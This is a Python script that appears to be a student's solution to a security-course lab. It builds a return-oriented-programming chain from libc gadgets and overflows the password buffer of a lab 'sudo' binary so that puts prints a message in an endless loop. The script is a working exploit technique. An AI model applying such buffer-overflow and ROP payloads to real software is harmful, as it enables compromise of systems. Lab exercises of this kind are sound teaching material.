import os
import sys
import base64

import addresses
from infosec.utils import assemble
from search import GadgetSearch


PATH_TO_SUDO = './sudo'
LIBC_DUMP_PATH = './libc.bin'


def get_string(student_id):
    return 'Take me (%s) to your leader!' % student_id

def get_gadgets(search: GadgetSearch) -> bytes:
   """
   This function searches the LIBC_DUMP_PATH for commands to create the loop gadget.
   """
   try:
      pop_ebp_gadget       = search.find('POP ebp')
      skip_4_bytes         = search.find('ADD esp, 0x4')
      pop_esp_gadget       = search.find('POP esp')
      message              = get_string('315129551')

      rop = addresses.address_to_bytes(pop_ebp_gadget)      + \
            addresses.address_to_bytes(addresses.PUTS)      + \
            addresses.address_to_bytes(addresses.PUTS)      + \
            addresses.address_to_bytes(skip_4_bytes)        + \
            addresses.address_to_bytes(addresses.RA + 28)   + \
            addresses.address_to_bytes(pop_esp_gadget)      + \
            addresses.address_to_bytes(addresses.RA + 8)    + \
            addresses.struct.pack('<%ds'%len(message) ,bytes(message,'latin1'))
      return rop
   except ValueError as e:
      print('error: could not find all gadgets')
      return NONE

def get_arg() -> bytes:
    """
    This function returns the (pre-encoded) `password` argument to be sent to
    the `sudo` program.

    This data should cause the program to execute our ROP-chain for printing our
    message in an endless loop. Make sure to return a `bytes` object and not an
    `str` object.

    NOTES:
    1. Use `addresses.PUTS` to get the address of the `puts` function.
    2. Don't write addresses of gadgets directly - use the search object to
       find the address of the gadget dynamically.

    WARNINGS:
    0. Don't delete this function or change it's name/parameters - we are going
       to test it directly in our tests, without running the main() function
       below.

    Returns:
         The bytes of the password argument.
    """
    search = GadgetSearch(LIBC_DUMP_PATH)
    rop    = get_gadgets(search)
    return rop.rjust(addresses.RA - addresses.BUFF_START + len(rop) ,bytes([90]))


def main(argv):
    # WARNING: DON'T EDIT THIS FUNCTION!
    # NOTE: os.execl() accepts `bytes` as well as `str`, so we will use `bytes`.
    os.execl(PATH_TO_SUDO, PATH_TO_SUDO, base64.b64encode(get_arg()))


if __name__ == '__main__':
    main(sys.argv)
